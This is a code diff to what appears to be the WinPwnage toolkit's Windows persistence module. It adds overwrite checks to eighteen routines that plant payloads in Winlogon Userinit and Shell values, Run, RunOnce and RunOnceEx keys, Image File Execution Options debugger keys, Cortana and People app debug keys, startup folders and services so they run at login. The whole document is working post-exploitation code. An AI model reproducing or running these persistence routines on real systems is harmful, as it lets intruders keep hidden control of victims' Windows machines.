@@ -18,7 +18,7 @@ persist1_info = {
 }
 
 
-def persist1(payload, name="", add=True):
+def persist1(payload, name="", check=True, add=True):
     ret = 1
     if not add:
         cmds = [
@@ -116,7 +116,7 @@ persist2_info = {
 }
 
 
-def persist2(payload, name="", add=True):
+def persist2(payload, name="", check=True, add=True):
     if not admin():
         log.error("Cannot proceed, we are not elevated")
         return
@@ -218,7 +218,7 @@ persist3_info = {
 }
 
 
-def persist3(payload, name="", add=True):
+def persist3(payload, name="", check=True, add=True):
     if not admin():
         log.error("Cannot proceed, we are not elevated")
         return
@@ -230,7 +230,11 @@ def persist3(payload, name="", add=True):
 
     accessibility_key = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility"
 
+    val = read_key("hklm", magnify_key, "Debugger")
+
     if not add:
+        if check and val != " ".join(payload):
+            return -1
         if remove_key(hkey="hklm", path=accessibility_key, name="Configuration"):
             if remove_key(hkey="hklm", path=magnify_key, delete_key=True):
                 log.info("Successfully removed persistence")
@@ -238,6 +242,10 @@ def persist3(payload, name="", add=True):
 
         log.error("Unable to remove persistence")
         return
+
+    target = get_target(val)
+    if check and val != " ".join(payload) and os.path.exists(target) and not access(target):
+        return -1
 
     if modify_key(hkey="hklm", path=magnify_key, name="Debugger", value=" ".join(payload), create=True):
         log.info(f"Successfully created Debugger key containing payload ({' '.join(payload)})")
@@ -260,21 +268,29 @@ persist4_info = {
 }
 
 
-def persist4(payload, name="", add=True):
+def persist4(payload, name="", check=True, add=True):
     if not admin():
         log.error("Cannot proceed, we are not elevated")
         return
 
     winlogon = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
     p = os.path.join(system_directory(), "userinit.exe,")
+
+    val = read_key("hklm", winlogon, "Userinit")
     if not add:
+        if check and val != f'{p}explorer "{" ".join(payload)}"':
+            return -1
         if modify_key(hkey="hklm", path=winlogon, name="Userinit", value=p):
             log.info("Successfully removed persistence")
             return 1
         log.error("Unable to remove persistence")
         return
 
-    if modify_key(hkey="hklm", path=winlogon, name="Userinit", value=p + f'explorer "{" ".join(payload)}"'):
+    target = get_target(val)
+    if check and val != f'{p}explorer "{" ".join(payload)}"' and os.path.exists(target) and not access(target):
+        return -1
+
+    if modify_key(hkey="hklm", path=winlogon, name="Userinit", value=f'{p}explorer "{" ".join(payload)}"'):
         log.info(f"Successfully created Userinit key containing payload ({' '.join(payload)})")
         log.info("Successfully installed persistence, payload will run at login")
         return 1
@@ -294,13 +310,20 @@ persist5_info = {
 }
 
 
-def persist5(payload, name="", add=True):
+def persist5(payload, name="", check=True, add=True):
+    val = read_key("hkcu", "Software\\Microsoft\\Windows\\CurrentVersion\\Run", name)
     if not add:
+        if check and val != f'explorer "{" ".join(payload)}"':
+            return -1
         if remove_key(hkey="hkcu", path="Software\\Microsoft\\Windows\\CurrentVersion\\Run", name=name):
             log.info("Successfully removed persistence")
             return 1
         log.error("Unable to remove persistence")
         return
+
+    target = get_target(val)
+    if check and val != f'explorer "{" ".join(payload)}"' and os.path.exists(target) and not access(target):
+        return -1
 
     if modify_key(hkey="hkcu", path="Software\\Microsoft\\Windows\\CurrentVersion\\Run", name=name, value=f'explorer "{" ".join(payload)}"'):
         log.info(f"Successfully created {name} key containing payload ({' '.join(payload)})")
@@ -322,7 +345,7 @@ persist6_info = {
 }
 
 
-def persist6(payload, name="", add=True):
+def persist6(payload, name="", check=True, add=True):
     if not admin():
         log.error("Cannot proceed, we are not elevated")
         return
@@ -332,12 +355,19 @@ def persist6(payload, name="", add=True):
     else:
         kpath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
 
+    val = read_key("hklm", kpath, name)
     if not add:
+        if check and val != f'explorer "{" ".join(payload)}"':
+            return -1
         if remove_key(hkey="hklm", path=kpath, name=name):
             log.info("Successfully removed persistence")
             return 1
         log.error("Unable to remove persistence")
         return
+
+    target = get_target(val)
+    if check and val != f'explorer "{" ".join(payload)}"' and os.path.exists(target) and not access(target):
+        return -1
 
     if modify_key(hkey="hklm", path=kpath, name=name, value=f'explorer "{" ".join(payload)}"'):
         log.info(f"Successfully created {name} key containing payload ({' '.join(payload)})")
@@ -359,7 +389,7 @@ persist7_info = {
 }
 
 
-def persist7(payload, name="", add=True):
+def persist7(payload, name="", check=True, add=True):
     if not admin():
         log.error("Cannot proceed, we are not elevated")
         return
@@ -404,7 +434,7 @@ persist8_info = {
 }
 
 
-def persist8(payload, name="", add=True):
+def persist8(payload, name="", check=True, add=True):
     startup_dir = os.path.join(os.path.expandvars("%AppData%"), r'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
     if not os.path.exists(startup_dir):
         log.error("Start up directory not found: {startup_dir}")
@@ -443,18 +473,19 @@ persist9_info = {
 }
 
 
-def persist9(payload, add=True):
+def persist9(payload, name="", check=True, add=True):
     try:
-        key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, r"Software\Classes\ActivatableClasses\Package", 0, _winreg.KEY_READ)
-        num = _winreg.QueryInfoKey(key)[0]
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Classes\ActivatableClasses\Package", 0, winreg.KEY_READ)
+        num = winreg.QueryInfoKey(key)[0]
+        kpath = None
         for x in range(0, num):
-            if "Microsoft.Windows.Cortana_" in _winreg.EnumKey(key, x):
+            if "Microsoft.Windows.Cortana_" in winreg.EnumKey(key, x):
                 kpath = os.path.join(
-                    r"Software\Classes\ActivatableClasses\Package", _winreg.EnumKey(key, x),
+                    r"Software\Classes\ActivatableClasses\Package", winreg.EnumKey(key, x),
                     r"DebugInformation\CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca"
                 )
                 break
-        kpath
+        assert kpath
     except Exception:
         log.error("Unable to add persistence, Cortana is unavailable on this system")
         return
@@ -487,18 +518,19 @@ persist10_info = {
 }
 
 
-def persist10(payload, add=True):
+def persist10(payload, name="", check=True, add=True):
     try:
-        key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, r"Software\Classes\ActivatableClasses\Package", 0, _winreg.KEY_READ)
-        num = _winreg.QueryInfoKey(key)[0]
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Classes\ActivatableClasses\Package", 0, winreg.KEY_READ)
+        num = winreg.QueryInfoKey(key)[0]
+        kpath = None
         for x in range(0, num):
-            if "Microsoft.People_" in _winreg.EnumKey(key, x):
+            if "Microsoft.People_" in winreg.EnumKey(key, x):
                 kpath = os.path.join(
-                    r"Software\Classes\ActivatableClasses\Package", _winreg.EnumKey(key, x),
+                    r"Software\Classes\ActivatableClasses\Package", winreg.EnumKey(key, x),
                     r"DebugInformation\x4c7a3b7dy2188y46d4ya362y19ac5a5805e5x.AppX368sbpk1kx658x0p332evjk2v0y02kxp.mca"
                 )
                 break
-        kpath
+        assert kpath
     except Exception:
         log.error("Unable to add persistence, People app is unavailable on this system")
         return
@@ -532,7 +564,7 @@ persist11_info = {
 }
 
 
-def persist11(payload, name="", add=True):
+def persist11(payload, name="", check=True, add=True):
     if not admin():
         log.error("Cannot proceed, we are not elevated")
         return False
@@ -600,12 +632,12 @@ persist12_info = {
 }
 
 
-def persist12(payload, name="", add=True):
+def persist12(payload, name="", check=True, add=True):
     if not admin():
         log.error("Cannot proceed, we are not elevated")
         return
 
-    servicename = b"WinPwnage"
+    servicename = bytes(name, 'utf-8')
     localhost = rb"\\localhost"
     ret = 0
 
@@ -662,13 +694,20 @@ persist13_info = {
 }
 
 
-def persist13(payload, name="", add=True):
+def persist13(payload, name="", check=True, add=True):
+    val = read_key("hkcu", "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", name)
     if not add:
+        if check and val != f'explorer "{" ".join(payload)}"':
+            return -1
         if remove_key(hkey="hkcu", path="Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", name=name):
             log.info("Successfully removed persistence")
             return 1
         log.error("Unable to remove persistence")
         return
+
+    target = get_target(val)
+    if check and val != f'explorer "{" ".join(payload)}"' and os.path.exists(target) and not access(target):
+        return -1
 
     if modify_key(hkey="hkcu", path="Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", name=name, value=f'explorer "{" ".join(payload)}"'):
         log.info(f"Successfully created {name} key containing payload ({' '.join(payload)})")
@@ -690,7 +729,7 @@ persist14_info = {
 }
 
 
-def persist14(payload, name="", add=True):
+def persist14(payload, name="", check=True, add=True):
     if not admin():
         log.error("Cannot proceed, we are not elevated")
         return
@@ -700,12 +739,19 @@ def persist14(payload, name="", add=True):
     else:
         kpath = "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
 
+    val = read_key("hklm", kpath, name)
     if not add:
+        if check and val != f'explorer "{" ".join(payload)}"':
+            return -1
         if remove_key(hkey="hklm", path=kpath, name=name):
             log.info("Successfully removed persistence")
             return 1
         log.error("Unable to remove persistence")
         return
+
+    target = get_target(val)
+    if check and val != f'explorer "{" ".join(payload)}"' and os.path.exists(target) and not access(target):
+        return -1
 
     if modify_key(hkey="hklm", path=kpath, name=name, value=f'explorer "{" ".join(payload)}"'):
         log.info(f"Successfully created {name} key containing payload ({' '.join(payload)})")
@@ -727,13 +773,20 @@ persist15_info = {
 }
 
 
-def persist15(payload, name="", add=True):
+def persist15(payload, name="", check=True, add=True):
+    val = read_key("hkcu", "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx", name)
     if not add:
+        if check and val != f'explorer "{" ".join(payload)}"':
+            return -1
         if remove_key(hkey="hkcu", path="Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx", name=name):
             log.info("Successfully removed persistence")
             return 1
         log.error("Unable to remove persistence")
         return
+
+    target = get_target(val)
+    if check and val != f'explorer "{" ".join(payload)}"' and os.path.exists(target) and not access(target):
+        return -1
 
     if modify_key(hkey="hkcu", path="Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx", name=name, value=f'explorer "{" ".join(payload)}"'):
         log.info(f"Successfully created {name} key containing payload ({' '.join(payload)})")
@@ -755,7 +808,7 @@ persist16_info = {
 }
 
 
-def persist16(payload, name="", add=True):
+def persist16(payload, name="", check=True, add=True):
     if not admin():
         log.error("Cannot proceed, we are not elevated")
         return
@@ -765,12 +818,19 @@ def persist16(payload, name="", add=True):
     else:
         kpath = "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx"
 
+    val = read_key("hklm", kpath, name)
     if not add:
+        if check and val != f'explorer "{" ".join(payload)}"':
+            return -1
         if remove_key(hkey="hklm", path=kpath, name=name):
             log.info("Successfully removed persistence")
             return 1
         log.error("Unable to remove persistence")
         return
+
+    target = get_target(val)
+    if check and val != f'explorer "{" ".join(payload)}"' and os.path.exists(target) and not access(target):
+        return -1
 
     if modify_key(hkey="hklm", path=kpath, name=name, value=f'explorer "{" ".join(payload)}"'):
         log.info(f"Successfully created {name} key containing payload ({' '.join(payload)})")
@@ -792,16 +852,23 @@ persist17_info = {
 }
 
 
-def persist17(payload, name="", add=True):
+def persist17(payload, name="", check=True, add=True):
     winlogon = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
+    val = read_key("hkcu", winlogon, "Shell")
     if not add:
+        if check and val != f'explorer.exe,explorer "{" ".join(payload)}"':
+            return -1
         if remove_key(hkey="hkcu", path=winlogon, name="Shell"):
             log.info("Successfully removed persistence")
             return 1
         log.error("Unable to remove persistence")
         return
 
-    if modify_key(hkey="hkcu", path=winlogon, name="Shell", value="explorer.exe," + f'explorer "{" ".join(payload)}"'):
+    target = get_target(val)
+    if check and val != f'explorer.exe,explorer "{" ".join(payload)}"' and os.path.exists(target) and not access(target):
+        return -1
+
+    if modify_key(hkey="hkcu", path=winlogon, name="Shell", value=f'explorer.exe,explorer "{" ".join(payload)}"'):
         log.info(f"Successfully created Shell key containing payload ({' '.join(payload)})")
         log.info("Successfully installed persistence, payload will run at login")
         return 1
@@ -821,21 +888,28 @@ persist18_info = {
 }
 
 
-def persist18(payload, name="", add=True):
+def persist18(payload, name="", check=True, add=True):
     if not admin():
         log.error("Cannot proceed, we are not elevated")
         return
 
     kpath = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
 
+    val = read_key("hklm", kpath, "Shell")
     if not add:
+        if check and val != f'explorer.exe,explorer "{" ".join(payload)}"':
+            return -1
         if modify_key(hkey="hklm", path=kpath, name="Shell", value="explorer.exe"):
             log.info("Successfully removed persistence")
             return 1
         log.error("Unable to remove persistence")
         return
 
-    if modify_key(hkey="hklm", path=kpath, name="Shell", value="explorer.exe," + f'explorer "{" ".join(payload)}"'):
+    target = get_target(val)
+    if check and val != f'explorer.exe,explorer "{" ".join(payload)}"' and os.path.exists(target) and not access(target):
+        return -1
+
+    if modify_key(hkey="hklm", path=kpath, name="Shell", value=f'explorer.exe,explorer "{" ".join(payload)}"'):
         log.info(f"Successfully created Shell key containing payload ({' '.join(payload)})")
         log.info("Successfully installed persistence, payload will run at login")
         return 1
